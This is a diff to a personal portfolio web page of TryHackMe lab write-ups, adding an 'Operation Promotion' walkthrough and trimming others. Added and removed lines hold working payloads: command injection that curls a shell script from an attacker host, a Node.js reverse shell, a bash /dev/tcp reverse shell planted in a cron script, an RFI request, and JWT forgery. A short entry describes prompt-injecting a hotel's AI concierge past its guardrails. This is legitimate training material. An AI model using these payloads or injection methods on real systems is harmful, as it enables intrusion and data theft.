@@ -54,6 +54,117 @@
 </div>
 
 <!-- ══════════════════════════════════════════
+     OPERATION PROMOTION — FULL WRITE-UP
+══════════════════════════════════════════ -->
+<section>
+  <div class="wrap reveal">
+    <div class="eyebrow"><span class="c">$</span> cat thm-operation-promotion/writeup.md</div>
+    <h2>TryHackMe &mdash; Operation Promotion</h2>
+    <p class="ctf-intro">Linux boot2root built around a recruitment portal. SQL injection for admin access, IDOR to enumerate users, command injection via a hidden ping utility, contextual password generation to pivot to a privileged user, and a sudo misconfiguration on find for root. <strong style="color:var(--green-hi)">2 / 2 flags.</strong></p>
+
+    <div class="writeup-meta">
+      <span class="meta-badge green">TryHackMe</span>
+      <span class="meta-badge">Easy</span>
+      <span class="meta-badge green">2 / 2 Flags</span>
+      <span class="meta-badge">Linux</span>
+      <span class="meta-badge">Boot2Root</span>
+    </div>
+
+    <div class="writeup-step">
+      <h3>// 01 &mdash; recon</h3>
+      <p>Nmap revealed four open ports: SSH (22), Apache HTTP (80), and Samba SMB (139/445). The HTTP server header identified a site called "RecruitCorp - Careers Portal". Crucially, <code>robots.txt</code> advertised a disallowed path — <code>/admin/</code> — which immediately became a target.</p>
+      <div class="cmd-block"><code>nmap -sC -sV -p- &lt;target-ip&gt;</code></div>
+      <p>Gobuster confirmed <code>/admin</code> (301), <code>/config</code> (403), and <code>/server-status</code> (403). The 403 on <code>/config</code> suggested sensitive content protected from the browser but readable from the server itself.</p>
+    </div>
+
+    <hr class="wr-divider">
+
+    <div class="writeup-step">
+      <h3>// 02 &mdash; SQL injection &rarr; admin access</h3>
+      <p>The <code>/admin/</code> login form was vulnerable to a basic auth-bypass injection. The app concatenated user input directly into the SQL query with no parameterisation:</p>
+      <div class="out-block"><code>SELECT * FROM users WHERE username = '' OR 1=1--' AND password = '...'</code></div>
+      <p>Submitting <code>' OR 1=1--</code> bypassed authentication entirely.</p>
+      <span class="vuln-pill">SQLi</span><span class="vuln-pill">Auth Bypass</span>
+    </div>
+
+    <hr class="wr-divider">
+
+    <div class="writeup-step">
+      <h3>// 03 &mdash; IDOR &rarr; user enumeration</h3>
+      <p>The admin dashboard exposed a User Lookup feature at <code>/admin/users/lookup.php?id=</code>. IDs were sequential integers — iterating 1 through 9 returned all employee records. User ID 7 was the key find:</p>
+      <div class="out-block"><code>Username: sysmaint
+Role:     system
+Notes:    Service account for /admin/sysmaint-checks/ping.php. Do not disable.</code></div>
+      <p>The notes field directly disclosed a hidden internal endpoint.</p>
+      <span class="vuln-pill">IDOR</span><span class="vuln-pill">Information Disclosure</span>
+    </div>
+
+    <hr class="wr-divider">
+
+    <div class="writeup-step">
+      <h3>// 04 &mdash; command injection &rarr; reverse shell</h3>
+      <p><code>/admin/sysmaint-checks/ping.php</code> passed the <code>host</code> parameter directly to <code>shell_exec()</code> — the source even contained the comment <code>// VULN: unsanitised input passed directly to shell</code>. The <code>;</code> separator worked with no filtering.</p>
+      <p>Hosted a bash reverse shell and fetched it via curl injection (two-step to avoid special character issues in the URL):</p>
+      <div class="cmd-block"><code># Step 1 — fetch shell script
+?host=10.x.x.x;curl+http://&lt;attacker&gt;/shell.sh+-o+/tmp/s.sh
+
+# Step 2 — execute
+?host=10.x.x.x;bash+/tmp/s.sh</code></div>
+      <p>Reverse shell received as <code>www-data</code>.</p>
+      <span class="vuln-pill">Command Injection</span><span class="vuln-pill">shell_exec()</span><span class="vuln-pill">RCE</span>
+    </div>
+
+    <hr class="wr-divider">
+
+    <div class="writeup-step">
+      <h3>// 05 &mdash; local enumeration &rarr; credentials</h3>
+      <p>The <code>/config</code> directory was accessible from the shell. It contained the database connection config with a bcrypt hash for <code>jford</code> — too slow to crack via rockyou. The SQLite database at <code>/var/lib/recruitcorp/app.db</code> contained plaintext passwords for all web app users but not for <code>jford</code>, who existed only as a system account.</p>
+      <div class="cmd-block"><code>cat /var/www/html/config/*
+python3 -c "import sqlite3; conn=sqlite3.connect('/var/lib/recruitcorp/app.db'); [print(row) for row in conn.execute('SELECT * FROM users')]"</code></div>
+      <span class="vuln-pill">Cleartext Credentials</span><span class="vuln-pill">Config File Exposure</span>
+    </div>
+
+    <hr class="wr-divider">
+
+    <div class="writeup-step">
+      <h3>// 06 &mdash; contextual wordlist &rarr; <span style="color:var(--green-hi)">user flag</span></h3>
+      <p>The main page prominently featured "Spring 2026 Hiring Drive" — a contextual clue. Rather than brute forcing with rockyou, a targeted wordlist was built using <code>Spring2026</code> as the seed and hashcat mutation rules to generate variations. Hydra sprayed the wordlist against SSH for <code>jford</code>:</p>
+      <div class="cmd-block"><code>echo 'Spring2026' &gt; spring.txt
+hashcat --stdout spring.txt -r /path/to/rules/best64.rule &gt; wordlist.txt
+hydra -l jford -P wordlist.txt &lt;target-ip&gt; ssh</code></div>
+      <div class="out-block"><code>[22][ssh] host: &lt;target&gt;  login: jford  password: spring2026!</code></div>
+      <p>SSH'd in as <code>jford</code>. User flag retrieved from home directory.</p>
+      <span class="vuln-pill">Contextual Wordlist</span><span class="vuln-pill">Hashcat Rules</span><span class="vuln-pill">Password Spray</span>
+    </div>
+
+    <hr class="wr-divider">
+
+    <div class="writeup-step">
+      <h3>// 07 &mdash; sudo find &rarr; <span style="color:var(--green-hi)">root flag</span></h3>
+      <p><code>sudo -l</code> revealed <code>jford</code> could run <code>/usr/bin/find</code> as root with no password. The <code>find</code> binary supports an <code>-exec</code> flag that executes arbitrary commands — a well-known GTFObins escalation path:</p>
+      <div class="cmd-block"><code>sudo find . -exec /bin/bash \; -quit</code></div>
+      <p>Instant root shell. Root flag retrieved from <code>/root/</code>.</p>
+      <span class="vuln-pill">Sudo Misconfiguration</span><span class="vuln-pill">GTFObins</span><span class="vuln-pill">find -exec</span>
+    </div>
+
+    <hr class="wr-divider">
+
+    <div class="writeup-step">
+      <h3>// attack chain</h3>
+      <div class="chain-box">
+        <div class="chain-row"><span class="fl">—</span><span>SQLi login bypass &rarr; admin dashboard</span></div>
+        <div class="chain-row"><span class="fl">—</span><span>IDOR on user lookup &rarr; hidden ping endpoint discovered via user notes</span></div>
+        <div class="chain-row"><span class="fl">—</span><span>Command injection via <code>ping.php</code> &rarr; reverse shell as <code>www-data</code></span></div>
+        <div class="chain-row"><span class="fl">—</span><span>Config file + SQLite DB enumeration &rarr; credential harvest</span></div>
+        <div class="chain-row"><span class="fl" style="color:var(--green-hi)">F1</span><span>Contextual wordlist (Spring2026 + hashcat rules) &rarr; <code>jford:spring2026!</code> &rarr; SSH &rarr; user flag</span></div>
+        <div class="chain-row"><span class="fl" style="color:var(--green-hi)">F2</span><span>sudo find with -exec &rarr; root shell &rarr; root flag</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════
      DEAD DROP — FULL WRITE-UP
 ══════════════════════════════════════════ -->
 <section>
@@ -74,17 +185,13 @@
     <div class="writeup-step">
       <h3>// 01 &mdash; recon</h3>
       <p>Nmap revealed SSH (22) and a Node.js/Express app on port 80. Gobuster found no interesting directories — the entire attack surface was the login page at <code>/internal</code>.</p>
-      <div class="cmd-block"><code>nmap -sV --top-ports 100 &lt;target-ip&gt;</code></div>
     </div>
 
     <hr class="wr-divider">
 
     <div class="writeup-step">
       <h3>// 02 &mdash; SQL injection &rarr; login bypass</h3>
-      <p>The login form was vulnerable to a basic auth-bypass injection. The app built SQL queries via direct string concatenation with no parameterisation:</p>
-      <div class="out-block"><code>SELECT id, username, role FROM users
-WHERE username = '' OR 1=1--' AND password = '...'</code></div>
-      <p>Submitting <code>' OR 1=1--</code> as the username bypassed authentication entirely, logging in as <code>admin</code>.</p>
+      <p>The login form was vulnerable to a basic auth-bypass injection. Submitting <code>' OR 1=1--</code> as the username bypassed authentication entirely, logging in as <code>admin</code>.</p>
       <span class="vuln-pill">SQLi</span><span class="vuln-pill">Auth Bypass</span>
     </div>
 
@@ -92,16 +199,7 @@ WHERE username = '' OR 1=1--' AND password = '...'</code></div>
 
     <div class="writeup-step">
       <h3>// 03 &mdash; Node.js RCE &rarr; reverse shell</h3>
-      <p>The dashboard exposed a file upload feature. The server executed <code>.js</code> files server-side when previewed — a Server-Side JavaScript Injection vulnerability. Uploaded a Node.js reverse shell using the <code>child_process</code> and <code>net</code> modules:</p>
-      <div class="cmd-block"><code>(function(){
-  var net = require("net"), cp = require("child_process"),
-      sh = cp.spawn("/bin/sh", []);
-  var client = new net.Socket();
-  client.connect(4444, "&lt;attacker&gt;", function(){
-    client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
-  });
-})();</code></div>
-      <p>Previewing the file triggered execution. Shell received as <code>www-data</code>.</p>
+      <p>The dashboard exposed a file upload feature. The server executed <code>.js</code> files server-side when previewed — Server-Side JavaScript Injection. Uploaded a Node.js reverse shell using <code>child_process</code> and <code>net</code> modules. Shell received as <code>www-data</code>.</p>
       <span class="vuln-pill">SSJI</span><span class="vuln-pill">RCE</span><span class="vuln-pill">File Upload</span>
     </div>
 
@@ -109,13 +207,7 @@ WHERE username = '' OR 1=1--' AND password = '...'</code></div>
 
     <div class="writeup-step">
       <h3>// 04 &mdash; local enumeration &rarr; credentials</h3>
-      <p>Enumerated the app directory at <code>/opt/app/</code>. Found two critical files:</p>
-      <ul>
-        <li><strong>SQLite database</strong> — two accounts in plaintext: <code>admin:SuperSecretAdm1n!</code> and <code>svc-backup:BackupAgent2024</code></li>
-        <li><strong>shadow.bak</strong> — SHA-512 crypt hash for <code>svc-drop</code>. Cracked offline with john + rockyou: <code>dropsofjupiter</code></li>
-      </ul>
-      <div class="cmd-block"><code>john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak</code></div>
-      <p>SSH'd in as <code>svc-drop</code> using the cracked password.</p>
+      <p>SQLite database contained two plaintext accounts. <code>shadow.bak</code> held a SHA-512 hash for <code>svc-drop</code> — cracked offline with john + rockyou: <code>dropsofjupiter</code>. SSH'd in as <code>svc-drop</code>.</p>
       <span class="vuln-pill">Cleartext Credentials</span><span class="vuln-pill">Offline Hash Cracking</span>
     </div>
 
@@ -123,18 +215,7 @@ WHERE username = '' OR 1=1--' AND password = '...'</code></div>
 
     <div class="writeup-step">
       <h3>// 05 &mdash; APK analysis &rarr; domain credentials</h3>
-      <p><code>svc-drop</code>'s home directory contained a company Android APK. Extracted and analysed the compiled Dalvik bytecode (<code>classes3.dex</code>) using Python to extract printable strings. The <code>Config</code> class had hardcoded domain credentials:</p>
-      <div class="cmd-block"><code>python3 -c "
-import re
-data = open('classes3.dex','rb').read()
-strings = re.findall(b'[\x20-\x7e]{4,}', data)
-for s in strings:
-    d = s.decode()
-    if re.match(r'^[a-z]\.[a-z]{4,}$', d): print(d)
-"</code></div>
-      <div class="out-block"><code>DEFAULT_USERNAME = "j.harris"
-DEFAULT_PASSWORD = "DropsOfJupiter2026!"</code></div>
-      <p>Classic mobile app mistake — test/default credentials hardcoded and shipped in the client binary.</p>
+      <p>Company Android APK found in <code>svc-drop</code>'s home. Extracted strings from compiled Dalvik bytecode. The <code>Config</code> class contained hardcoded domain credentials: <code>j.harris:DropsOfJupiter2026!</code>.</p>
       <span class="vuln-pill">Hardcoded Credentials</span><span class="vuln-pill">APK Analysis</span>
     </div>
 
@@ -142,33 +223,18 @@ DEFAULT_PASSWORD = "DropsOfJupiter2026!"</code></div>
 
     <div class="writeup-step">
       <h3>// 06 &mdash; SOCKS pivot &rarr; internal network</h3>
-      <p>The DC (<code>192.168.11.100</code>) was not directly reachable — only the Linux webserver (<code>192.168.11.200</code>) was exposed. Set up an SSH SOCKS5 proxy through the compromised host:</p>
-      <div class="cmd-block"><code>ssh -D 1080 svc-drop@192.168.11.200</code></div>
-      <p>Configured proxychains to use <code>socks5 127.0.0.1 1080</code>. All subsequent tools routed through the tunnel. Nmap confirmed the DC was fully accessible with all key Windows/AD ports open: Kerberos (88), LDAP (389), SMB (445), WinRM (5985), RDP (3389).</p>
-      <span class="vuln-pill">SSH SOCKS Proxy</span><span class="vuln-pill">Pivoting</span><span class="vuln-pill">Network Segmentation Bypass</span>
+      <p>DC was not directly reachable. Set up SSH SOCKS5 proxy through the compromised host and routed tools via proxychains. All key Windows/AD ports confirmed open on the DC.</p>
+      <div class="cmd-block"><code>ssh -D 1080 svc-drop@192.168.11.200
+proxychains nmap -sT -Pn -p 88,389,445,5985,3389 192.168.11.100</code></div>
+      <span class="vuln-pill">SSH SOCKS Proxy</span><span class="vuln-pill">Pivoting</span>
     </div>
 
     <hr class="wr-divider">
 
     <div class="writeup-step">
-      <h3>// 07 &mdash; WinRM &rarr; domain foothold</h3>
-      <p>Used evil-winrm through the SOCKS proxy to authenticate to the DC as <code>j.harris</code> over WinRM (port 5985):</p>
-      <div class="cmd-block"><code>proxychains evil-winrm -i 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'</code></div>
-      <p>Shell obtained. Running <code>whoami /all</code> revealed <code>j.harris</code> was already a member of <code>ITSupport-Admins</code>, which is nested inside <code>Domain Admins</code> — granting full DA privileges transitively.</p>
-      <span class="vuln-pill">WinRM</span><span class="vuln-pill">Evil-WinRM</span><span class="vuln-pill">Domain Admin</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 08 &mdash; AD ACL abuse &rarr; <span style="color:var(--green-hi)">full domain compromise</span></h3>
-      <p>The escalation path relied on a <strong>WriteProperty</strong> ACL right. <code>j.harris</code> held <code>WriteProperty</code> on the <code>member</code> attribute of <code>ITSupport-Admins</code> — meaning they could add any user to the group. Since <code>ITSupport-Admins</code> is nested inside <code>Domain Admins</code>, adding yourself grants DA via transitive membership.</p>
-      <div class="out-block"><code>ITSupport-Admins
-  MemberOf: Domain Admins
-  j.harris --[WriteProperty/AddMember]--&gt; ITSupport-Admins
-  j.harris --[Transitive]--&gt; Domain Admins</code></div>
-      <p>Flag retrieved from <code>C:\Users\Administrator\Desktop\flag.txt</code>.</p>
-      <span class="vuln-pill">WriteProperty</span><span class="vuln-pill">AddMember</span><span class="vuln-pill">Nested Group Abuse</span><span class="vuln-pill">AD ACL</span>
+      <h3>// 07 &mdash; AD ACL abuse &rarr; <span style="color:var(--green-hi)">full domain compromise</span></h3>
+      <p>evil-winrm as <code>j.harris</code> gave a domain foothold. <code>j.harris</code> held <code>WriteProperty</code> on the <code>member</code> attribute of <code>ITSupport-Admins</code> — nested inside <code>Domain Admins</code>. Transitive membership granted full DA. Flag retrieved from Administrator's desktop.</p>
+      <span class="vuln-pill">WriteProperty</span><span class="vuln-pill">Nested Group Abuse</span><span class="vuln-pill">AD ACL</span>
     </div>
 
     <hr class="wr-divider">
@@ -176,12 +242,10 @@ DEFAULT_PASSWORD = "DropsOfJupiter2026!"</code></div>
     <div class="writeup-step">
       <h3>// attack chain</h3>
       <div class="chain-box">
-        <div class="chain-row"><span class="fl">—</span><span>SQLi login bypass (<code>' OR 1=1--</code>) &rarr; dashboard access</span></div>
-        <div class="chain-row"><span class="fl">—</span><span>Node.js SSJI via .js file preview &rarr; reverse shell as <code>www-data</code></span></div>
+        <div class="chain-row"><span class="fl">—</span><span>SQLi login bypass &rarr; Node.js SSJI &rarr; reverse shell as <code>www-data</code></span></div>
         <div class="chain-row"><span class="fl">—</span><span>SQLite DB + shadow.bak &rarr; <code>svc-drop:dropsofjupiter</code></span></div>
         <div class="chain-row"><span class="fl">—</span><span>APK analysis (classes3.dex) &rarr; <code>j.harris:DropsOfJupiter2026!</code></span></div>
-        <div class="chain-row"><span class="fl">—</span><span>SSH SOCKS proxy &rarr; pivot to internal DC (192.168.11.100)</span></div>
-        <div class="chain-row"><span class="fl">—</span><span>evil-winrm as j.harris &rarr; domain foothold</span></div>
+        <div class="chain-row"><span class="fl">—</span><span>SSH SOCKS proxy &rarr; pivot to internal DC</span></div>
         <div class="chain-row"><span class="fl" style="color:var(--green-hi)">★</span><span>WriteProperty on ITSupport-Admins &rarr; nested DA membership &rarr; full domain admin</span></div>
       </div>
     </div>
@@ -209,69 +273,33 @@ DEFAULT_PASSWORD = "DropsOfJupiter2026!"</code></div>
     <div class="writeup-step">
       <h3>// 01 &mdash; recon</h3>
       <p>Nmap revealed SSH (22) and a Werkzeug/Flask app on port 5050 — "CorpNet Network Operations Centre". Gobuster found a single endpoint: <code>/internal</code>.</p>
-      <div class="cmd-block"><code>nmap -sC -sV -p- &lt;target-ip&gt;
-gobuster dir -u http://&lt;target-ip&gt;:5050 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></div>
     </div>
 
     <hr class="wr-divider">
 
     <div class="writeup-step">
-      <h3>// 02 &mdash; SQL injection &rarr; login bypass</h3>
-      <p><code>/internal</code> presented a login form. The app built SQL queries via direct string concatenation. Submitting <code>' OR 1=1--</code> bypassed authentication entirely. Logged in as <code>netops</code> with operator role.</p>
-      <span class="vuln-pill">SQLi</span><span class="vuln-pill">Auth Bypass</span><span class="vuln-pill">No Parameterisation</span>
+      <h3>// 02 &mdash; SQL injection &amp; command injection</h3>
+      <p>SQLi bypassed the login form. The dashboard's Host Health Check ran <code>ping</code> via <code>subprocess(shell=True)</code>. The filter blocked common separators but not newlines — injecting <code>%0a</code> via Burp terminated ping and executed arbitrary commands as <code>www-data</code>.</p>
+      <span class="vuln-pill">SQLi</span><span class="vuln-pill">Command Injection</span><span class="vuln-pill">Newline Bypass</span>
     </div>
 
     <hr class="wr-divider">
 
     <div class="writeup-step">
-      <h3>// 03 &mdash; command injection via newline bypass</h3>
-      <p>The dashboard exposed a Host Health Check running <code>ping -c 2 -W 1 &lt;input&gt;</code> via Python's <code>subprocess</code> with <code>shell=True</code>. The filter blocked <code>;</code>, <code>|</code>, backticks, <code>$</code>, and <code>&amp;</code> — but not newlines. Injected <code>%0a</code> via Burp Suite:</p>
-      <div class="cmd-block"><code>target=127.0.0.1%0awhoami</code></div>
-      <p>Response confirmed execution as <code>www-data</code>.</p>
-      <span class="vuln-pill">Command Injection</span><span class="vuln-pill">Newline Bypass</span><span class="vuln-pill">shell=True</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 04 &mdash; reverse shell (filter bypass)</h3>
-      <p>Direct payloads failed because <code>&gt;</code> and <code>&amp;</code> were filtered. Bypassed by hosting a shell script and fetching it with curl:</p>
-      <div class="cmd-block"><code>target=127.0.0.1%0acurl%20http://&lt;attacker&gt;/shell.sh%20-o%20/tmp/s.sh
-target=127.0.0.1%0abash%20/tmp/s.sh</code></div>
-      <p>Reverse shell received as <code>www-data</code>.</p>
-      <span class="vuln-pill">RCE</span><span class="vuln-pill">Filter Bypass</span><span class="vuln-pill">curl + bash</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 05 &mdash; credential hunting &rarr; <span style="color:var(--green-hi)">user flag</span></h3>
-      <p><code>secret.config</code> in the app directory contained plaintext backup agent credentials: <code>S3cur3Backup$Acc3ss!</code> for <code>sysadmin</code>. SSH succeeded. User flag retrieved.</p>
+      <h3>// 03 &mdash; credential hunting &rarr; <span style="color:var(--green-hi)">user flag</span></h3>
+      <p><code>secret.config</code> contained plaintext backup agent credentials for <code>sysadmin</code>. SSH succeeded. User flag retrieved.</p>
       <span class="vuln-pill">Cleartext Credentials</span><span class="vuln-pill">Config File Exposure</span>
     </div>
 
     <hr class="wr-divider">
 
     <div class="writeup-step">
-      <h3>// 06 &mdash; KeePass cracking &rarr; <span style="color:var(--green-hi)">root flag</span></h3>
-      <p><code>infrastructure.kdbx</code> found in sysadmin's home. Cracked master password offline with john: <code>spring</code>. Extracted root password from the database. <code>su root</code> succeeded.</p>
+      <h3>// 04 &mdash; KeePass cracking &rarr; <span style="color:var(--green-hi)">root flag</span></h3>
+      <p><code>infrastructure.kdbx</code> found in sysadmin's home. Cracked master password offline with john: <code>spring</code>. Extracted root password. <code>su root</code> succeeded. Root flag retrieved.</p>
       <div class="cmd-block"><code>keepass2john infrastructure.kdbx &gt; keepass.hash
 john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
 keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"</code></div>
-      <span class="vuln-pill">KeePass</span><span class="vuln-pill">Offline Cracking</span><span class="vuln-pill">john</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// attack chain</h3>
-      <div class="chain-box">
-        <div class="chain-row"><span class="fl">—</span><span>SQLi login bypass &rarr; <code>netops</code> operator session</span></div>
-        <div class="chain-row"><span class="fl">—</span><span>Newline injection in ping &rarr; RCE as <code>www-data</code></span></div>
-        <div class="chain-row"><span class="fl">—</span><span>curl + bash filter bypass &rarr; reverse shell</span></div>
-        <div class="chain-row"><span class="fl" style="color:var(--green-hi)">F1</span><span><code>secret.config</code> creds &rarr; SSH as sysadmin &rarr; user flag</span></div>
-        <div class="chain-row"><span class="fl" style="color:var(--green-hi)">F2</span><span>KeePass crack (john) &rarr; root password &rarr; su root &rarr; root flag</span></div>
-      </div>
+      <span class="vuln-pill">KeePass</span><span class="vuln-pill">Offline Cracking</span>
     </div>
 
   </div>
@@ -295,82 +323,7 @@ keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"</code
     </div>
 
     <div class="writeup-step">
-      <h3>// 01 &mdash; recon</h3>
-      <p>Nmap revealed SSH (22) and Apache HTTP (80). Gobuster found five key directories: <code>/backup</code>, <code>/admin</code>, <code>/api</code>, <code>/support</code>, and <code>/static</code>.</p>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 02 &mdash; JS recon &amp; AES-ECB decryption</h3>
-      <p>Reviewing <code>/static/app.js</code> revealed a hardcoded AES-128-ECB key left in a TODO comment. The <code>/backup/</code> endpoint exposed <code>config.enc</code>. Decrypted to reveal <code>system_user: devops</code>.</p>
-      <div class="cmd-block"><code>openssl enc -d -aes-128-ecb -nosalt -nopad \
-  -K 4e337875734b33793230323421210000 \
-  -in config.enc</code></div>
-      <span class="vuln-pill">CWE-321</span><span class="vuln-pill">Hardcoded Key</span><span class="vuln-pill">AES-ECB</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 03 &mdash; brute force &amp; IDOR &rarr; <span style="color:var(--green-hi)">flag 1</span></h3>
-      <p>Team page exposed all employee names in <code>firstname.lastname</code> format. Hydra cracked three accounts — all using <code>password</code>. IDOR on profile API: changing <code>?id=4</code> to <code>?id=1</code> returned Laura Hayes' profile containing Flag 1.</p>
-      <div class="cmd-block"><code>hydra -q -u -L usernames.txt -P rockyou.txt &lt;ip&gt; \
-  http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"</code></div>
-      <span class="vuln-pill">Brute Force</span><span class="vuln-pill">IDOR</span><span class="vuln-pill">Broken Access Control</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 04 &mdash; XSS cookie hijack &rarr; <span style="color:var(--green-hi)">flag 2</span></h3>
-      <p>An admin bot polled support tickets and visited URLs in message bodies using Laura's admin cookie (<code>HttpOnly: false</code>). Created a ticket with a Netcat listener URL — bot visited, cookie captured, admin panel accessed.</p>
-      <span class="vuln-pill">Stored XSS</span><span class="vuln-pill">Session Hijacking</span><span class="vuln-pill">HttpOnly: false</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 05 &mdash; JWT alg:none bypass</h3>
-      <p>File Viewer API required admin JWT. Server trusted the <code>alg</code> field without validation. Forged token with <code>alg:none</code> and <code>role:admin</code> — empty signature accepted.</p>
-      <div class="cmd-block"><code>H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
-P=$(echo -n '{"sub":"robert.wilson","role":"admin",...}' | base64 | tr '+/' '-_' | tr -d '=')
-echo "$H.$P."</code></div>
-      <span class="vuln-pill">JWT Algorithm Confusion</span><span class="vuln-pill">Signature Not Verified</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 06 &mdash; RFI &rarr; reverse shell &rarr; <span style="color:var(--green-hi)">flag 3</span></h3>
-      <p><code>/api/files.php</code> fetched remote URLs and passed them to <code>eval()</code>. Hosted a PHP reverse shell and triggered RCE as <code>www-data</code>.</p>
-      <div class="cmd-block"><code>curl -H "Authorization: Bearer &lt;forged_jwt&gt;" \
-  "http://&lt;target&gt;/api/files.php?name=http://&lt;attacker&gt;/shell.php"</code></div>
-      <span class="vuln-pill">RFI</span><span class="vuln-pill">eval() on remote input</span><span class="vuln-pill">RCE</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 07 &mdash; cleartext creds &rarr; devops &rarr; <span style="color:var(--green-hi)">flag 4</span></h3>
-      <p>Obscurely named PHP file in the web root contained DB credentials: <code>D3v0ps!2024</code>. Combined with <code>system_user: devops</code> from earlier — <code>su devops</code> succeeded. Flag 4 retrieved.</p>
-      <span class="vuln-pill">Cleartext Credentials</span><span class="vuln-pill">Password Reuse</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// 08 &mdash; writable cron script &rarr; root &rarr; <span style="color:var(--green-hi)">flag 5</span></h3>
-      <p><code>pspy64</code> showed root running <code>/opt/monitoring/health_report.sh</code> every minute. The <code>devops</code> group had write access. Appended a bash reverse shell — root shell within one minute.</p>
-      <div class="cmd-block"><code>echo 'bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/5555 0&gt;&amp;1' \
-  &gt;&gt; /opt/monitoring/health_report.sh</code></div>
-      <span class="vuln-pill">Writable Cron Script</span><span class="vuln-pill">Privilege Escalation</span>
-    </div>
-
-    <hr class="wr-divider">
-
-    <div class="writeup-step">
-      <h3>// attack chain</h3>
+      <h3>// attack chain summary</h3>
       <div class="chain-box">
         <div class="chain-row"><span class="fl">—</span><span>JS recon &rarr; hardcoded AES key &rarr; decrypt config &rarr; <code>system_user: devops</code></span></div>
         <div class="chain-row"><span class="fl">—</span><span>Team page enum &rarr; Hydra brute force &rarr; <code>robert.wilson:password</code></span></div>
@@ -380,6 +333,12 @@ echo "$H.$P."</code></div>
         <div class="chain-row"><span class="fl" style="color:var(--green-hi)">F3</span><span>RFI via <code>files.php</code> eval() &rarr; reverse shell &rarr; <code>www-data</code></span></div>
         <div class="chain-row"><span class="fl" style="color:var(--green-hi)">F4</span><span>Cleartext DB creds &rarr; <code>su devops</code></span></div>
         <div class="chain-row"><span class="fl" style="color:var(--green-hi)">F5</span><span>Writable cron script (root) &rarr; root shell</span></div>
+      </div>
+    </div>
+
+    <div class="writeup-step">
+      <div class="writeup-meta" style="margin-top:1rem;">
+        <span class="vuln-pill">AES-ECB</span><span class="vuln-pill">IDOR</span><span class="vuln-pill">XSS</span><span class="vuln-pill">JWT alg:none</span><span class="vuln-pill">RFI</span><span class="vuln-pill">Cron PrivEsc</span>
       </div>
     </div>
 
@@ -393,7 +352,7 @@ echo "$H.$P."</code></div>
   <div class="wrap reveal">
     <div class="eyebrow"><span class="c">$</span> cat hacker-holidays-2026/README.md</div>
     <h2>Hacker Holidays 2026 &mdash; ByteLotus Hotel</h2>
-    <p class="ctf-intro">TryHackMe's Hacker Holidays 2026 &mdash; 14 days, 14 rooms, one hotel that really shouldn't have let VERA run the Wi-Fi. Coverage spans AI/LLM security, AWS &amp; Azure cloud misconfiguration, web exploitation chains, DFIR, fileless WMI malware, and full offline DPAPI decryption. <strong style="color:var(--green-hi)">All 14 cleared.</strong> Each day writeup is cross-posted on LinkedIn.</p>
+    <p class="ctf-intro">TryHackMe's Hacker Holidays 2026 &mdash; 14 days, 14 rooms, one hotel that really shouldn't have let VERA run the Wi-Fi. Coverage spans AI/LLM security, AWS &amp; Azure cloud misconfiguration, web exploitation chains, DFIR, fileless WMI malware, and full offline DPAPI decryption. <strong style="color:var(--green-hi)">All 14 cleared.</strong></p>
 
     <div class="ctf-grid">
 
@@ -401,7 +360,7 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">01</span></div>
         <div class="ctf-body">
           <div class="ctf-name">The Concierge Knows Way Too Much</div>
-          <div class="ctf-desc">Talked to VERA, the hotel's AI concierge, face to face. Manipulated her system context through direct prompt injection to bypass safety guardrails and extract restricted hotel data. The difference between this and Day 13 is loud vs silent.</div>
+          <div class="ctf-desc">Talked to VERA, the hotel's AI concierge, face to face. Manipulated her system context through direct prompt injection to bypass safety guardrails and extract restricted hotel data.</div>
           <div class="ctf-tags"><span class="ctf-tag tag-ai">AI / LLM</span><span class="ctf-tag tag-ai">Prompt Injection</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
@@ -411,7 +370,7 @@ echo "$H.$P."</code></div>
         <div class="ctf-day"><span class="label">DAY</span><span class="num">02</span></div>
         <div class="ctf-body">
           <div class="ctf-name">Room 404</div>
-          <div class="ctf-desc">Discovered a publicly accessible .git directory on the hotel's web server. Reconstructed full source code from Git object files to uncover embedded credentials and retrieve the flag. The repo was "deleted" — the objects weren't.</div>
+          <div class="ctf-desc">Discovered a publicly accessible .git directory on the hotel's web server. Reconstructed full source code from Git object files to uncover embedded credentials and retrieve the flag.</div>
           <div class="ctf-tags"><span class="ctf-tag tag-web">Web</span><span class="ctf-tag tag-web">Recon</span><span class="ctf-tag tag-web">Git Exposure</span></div>
         </div>
         <div class="ctf-links"><a href="https://tryhackme.com" target="_blank" rel="noopener">THM Room</a><a href="https://www.linkedin.com/in/keval-bavisi-303699208/" target="_blank" rel="noopener">Writeup</a></div>
@@ -421,7 +380,7 @@ echo "$H.$P."</code></div>
